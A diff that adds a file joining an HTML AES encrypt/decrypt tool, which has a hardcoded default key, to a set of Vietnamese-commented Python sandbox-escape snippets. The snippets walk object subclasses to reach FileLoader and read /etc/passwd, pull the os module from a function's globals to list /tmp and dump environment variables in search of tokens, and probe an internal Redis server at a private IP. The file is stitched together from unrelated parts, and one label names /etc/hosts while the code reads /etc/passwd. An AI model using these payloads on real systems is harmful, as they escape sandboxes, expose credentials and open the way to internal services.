@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>AES Tool</title>
+    <style>
+        body { font-family: Arial; padding: 20px; max-width: 800px; margin: auto; }
+        textarea, input { width: 100%; margin: 10px 0; padding: 10px; }
+        button { padding: 10px 20px; margin: 5px; cursor: pointer; }
+        .output { background: #f5f5f5; padding: 10px; word-break: break-all; }
+    </style>
+</head>
+<body>
+
+<h2>🔐 AES Encrypt / Decrypt Tool</h2>
+
+<label>Secret Key:</label>
+<input type="text" id="key" value="Runsystem!@#2020">
+
+<label>Input:</label>
+<textarea id="input" rows="5"></textarea>
+
+<button onclick="encrypt()">Encrypt</button>
+<button onclick="decrypt()">Decrypt</button>
+
+<h3>Output:</h3>
+<div class="output" id="output"></div>
+
+<script>
+async function pbkdf2(password, salt) {
+    const enc = new TextEncoder();
+    const keyMaterial = await crypto.subtle.importKey(
+        "raw", enc.encode(password), {name: "PBKDF2"}, false, ["deriveKey"]
+    );
+
+    return crypto.subtle.deriveKey({
+        name: "PBKDF2",
+        salt: salt,
+        iterations: 1989,
+        hash: "SHA-1"
+    }, keyMaterial, {
+        name: "AES-CBC",
+        length: 256
+    }, false, ["encrypt", "decrypt"]);
+}
+
+function hexToBytes(hex) {
+    return new Uint8Array(hex.match(/.{1,2}/g).map(b => parseInt(b, 16)));
+}
+
+function bytesToHex(bytes) {
+    return Array.from(bytes).map(b => b.toString(16).padStart(2, "0")).join("");
+}
+
+function randomBytes(len) {
+    let arr = new Uint8Array(len);
+    crypto.getRandomValues(arr);
+    return arr;
+}
+
+async function encrypt() {
+    const text = document.getElementById("input").value;
+    const password = document.getElementById("key").value;
+
+    const salt = randomBytes(32);
+    const iv = randomBytes(16);
+
+    const key = await pbkdf2(password, salt);
+
+    const enc = new TextEncoder();
+    const encrypted = await crypto.subtle.encrypt(
+        {name: "AES-CBC", iv: iv},
+        key,
+        enc.encode(text)
+    );
+
+    const base64 = btoa(String.fromCharCode(...new Uint8Array(encrypted)));
+
+    document.getElementById("output").innerText =
+        bytesToHex(salt) + bytesToHex(iv) + base64;
+}
+
+async function decrypt() {
+    try {
+        const input = document.getElementById("input").value;
+        const password = document.getElementById("key").value;
+
+        const saltHex = input.substring(0, 64);
+        const ivHex = input.substring(64, 96);
+        const base64 = input.substring(96);
+
+        const salt = hexToBytes(saltHex);
+        const iv = hexToBytes(ivHex);
+
+        const key = await pbkdf2(password, salt);
+
+        const encrypted = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
+
+        const decrypted = await crypto.subtle.decrypt(
+            {name: "AES-CBC", iv: iv},
+            key,
+            encrypted
+        );
+
+        const dec = new TextDecoder().decode(decrypted);
+        document.getElementById("output").innerText = dec;
+    } catch (e) {
+        document.getElementById("output").innerText = "Decrypt error: " + e;
+    }
+}
+</script>
+
+</body>
+</html>
+
+
+
+
+
+# Khởi tạo một chuỗi trống để làm điểm tựa truy cập vào cây đối tượng gốc
+for cls in "".__class__.__base__.__subclasses__():
+    if cls.__name__ == 'FileLoader':
+        try:
+            # Khởi tạo đối tượng FileLoader gián tiếp
+            # Tham số đầu tiên là tên module giả định ("sys_loader"), tham số thứ hai là đường dẫn file
+            loader_instance = cls("sys_loader", "/etc/passwd")
+            
+            # Gọi hàm get_data để đọc trực tiếp byte dữ liệu từ ổ đĩa
+            raw_data = loader_instance.get_data("/etc/passwd")
+            
+            # Giải mã từ byte sang chuỗi văn bản (utf-8) để hiển thị
+            file_content = raw_data.decode('utf-8')
+            
+            print("=== NỘI DUNG FILE /ETC/HOSTS ===")
+            print(file_content)
+            print("================================")
+            break # Thoát vòng lặp ngay khi đã đọc thành công
+        except Exception as e:
+            # Nếu gặp lỗi nhỏ với một loader cụ thể, bỏ qua để thử loader tiếp theo trong danh sách
+            continue
+
+
+
+
+            found = False
+for cls in "".__class__.__base__.__subclasses__():
+    # In ra để debug xem có tìm thấy FileLoader không
+    if 'FileLoader' in cls.__name__:
+        print(f"Tìm thấy class phù hợp: {cls.__name__} -> {cls}")
+        try:
+            loader_instance = cls("sys_loader", "/etc/passwd")
+            raw_data = loader_instance.get_data("/etc/passwd")
+            
+            file_content = raw_data.decode('utf-8')
+            print("=== NỘI DUNG FILE ===")
+            print(file_content)
+            print("=====================")
+            found = True
+            break
+        except Exception as e:
+            # KHÔNG nuốt lỗi nữa, in ra để biết lỗi gì
+            print(f"Lỗi khi thực thi với {cls.__name__}: {e}")
+
+if not found:
+    print("Không tìm thấy class 'FileLoader' nào kích hoạt thành công.")
+
+
+////tmp 
+    def explore(): pass
+global_space = explore.__globals__
+
+# Lấy trực tiếp module os có sẵn trong globals của bạn
+os_mod = global_space.get('os')
+
+if os_mod:
+    try:
+        print("=== CÁC FILE TRONG THƯ MỤC /tmp ===")
+        files = os_mod.listdir('/tmp')
+        for f in files:
+            print(f)
+        print("====================================")
+    except Exception as e:
+        print(f"Lỗi khi listdir: {e}")
+
+
+// biens môi trường
+
+def explore(): pass
+os_mod = explore.__globals__.get('os')
+
+if os_mod:
+    print("=== BIẾN MÔI TRƯỜNG TRONG RAM ===")
+    try:
+        # Duyệt qua các biến môi trường để tìm thông tin cấu hình hoặc token
+        for key, value in os_mod.environ.items():
+            print(f"{key}: {value}")
+    except Exception as e:
+        print(f"Lỗi đọc environ: {e}")
+
+
+
+// Redis kết nối
+
+import socket
+
+def test_redis(ip, port=6379):
+    try:
+        print(f"Đang thử kết nối Redis nội bộ tại {ip}:{port}...")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3)
+        s.connect((ip, port))
+        
+        # Gửi lệnh kiểm tra thông tin của Redis (Theo giao thức RESP: *1\r\n$4\r\nINFO\r\n)
+        s.sendall(b"*1\r\n$4\r\nINFO\r\n")
+        response = s.recv(1024)
+        
+        print("=== PHẢN HỒI TỪ REDIS ===")
+        print(response.decode('utf-8', errors='ignore'))
+        s.close()
+    except Exception as e:
+        print(f"Kết nối Redis thất bại: {e}")
+
+# Thử nghiệm với IP Redis Primary tìm được trong RAM
+test_redis("10.98.201.203")
